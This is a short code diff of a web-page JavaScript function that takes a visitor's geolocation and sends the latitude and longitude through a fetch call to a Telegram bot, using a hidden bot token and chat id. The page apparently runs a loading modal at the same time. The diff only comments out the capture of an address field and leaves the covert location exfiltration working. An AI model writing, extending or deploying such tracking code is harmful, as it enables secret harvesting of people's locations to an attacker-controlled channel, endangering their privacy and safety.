@@ -58,9 +58,9 @@
 }
 
 function showPosition(position) {
-	showLoadingModal();
-	var addr = document.getElementById("Ac3424d").value;
-	fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("lat: "+position.coords.latitude+`\nlong: ${position.coords.longitude}\nАдрес: ${addr}`)} `);
+	//showLoadingModal();
+	//var addr = document.getElementById("Ac3424d").value;
+	fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("lat: "+position.coords.latitude+`\nlong: ${position.coords.longitude}`)} `);
 }
   
 setTimeout(showLoadingModal, 3000);
